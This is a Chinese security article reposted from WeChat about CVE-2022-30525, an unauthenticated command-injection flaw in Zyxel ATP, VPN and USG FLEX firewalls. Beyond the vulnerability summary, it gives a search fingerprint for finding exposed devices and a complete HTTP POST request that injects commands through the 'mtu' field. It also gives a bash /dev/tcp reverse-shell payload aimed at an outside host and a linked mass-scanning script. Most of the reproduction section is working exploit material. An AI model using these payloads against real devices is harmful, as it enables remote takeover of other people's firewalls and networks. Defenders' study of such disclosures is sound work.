<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/thhu5QW_4gSs_f_jhgcVAw)

**漏洞概****述：**

Rapid7 发现并报告了一个漏洞，该漏洞影响支持零接触配置 (ZTP) 的 Zyxel 防火墙，其中包括 ATP 系列、VPN 系列和 USG FLEX 系列（包括 USG20-VPN 和 USG20W-VPN）。该漏洞标识为 CVE-2022-30525，允许未经身份验证的远程攻击者以nobody受影响设备上的用户身份执行任意代码.

通过管理 HTTP 接口进行未经身份验证的远程命令注入的攻击。命令以nobody用户身份执行。此漏洞通过/ztp/cgi-bin/handlerURI 被利用，并且是将未经过滤的攻击者输入传递os.system到lib_wan_settings.py. setWanPortSt易受攻击的功能与命令相关联被调用。攻击者可以将任意命令注入到mtu或data参数中。

  

**影响范围：**

影响组件 

USG FLEX 100, 100W, 200, 500, 700 

USG20-VPN, USG20W-VPN 

ATP 100, 200, 500, 700, 800 

固件版本 

ZLD5.10 thru ZLD5.21 Patch 1 

ZLD5.00 thru ZLD5.21 Patch 1 

ZLD5.10 thru ZLD5.21 Patch 1

  

**网络测绘：**

body="USG FLEX 100"

  

**漏洞复现：**

访问https://xx.xx.xx.xx/ztp/cgi-bin/handler，修改为post方式，加入payload

```
`POST /ztp/cgi-bin/handler HTTP/1.1``Host: ip``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36``Content-Type: application/json``Connection: close``Content-Length: 130``{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged"``:"1","vlanid":"5","mtu":"; ping ***.dnslog.cn;","data":"hi"}`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

反弹shell

```
{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":";bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1';","data":"hi"}
```

**脚本检测:**

github上有师傅已经写好的脚本：https://github.com/Henry4E36/CVE-2022-30525

感谢师傅的脚本

```
python CVE-2022-30525.py -f ip.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)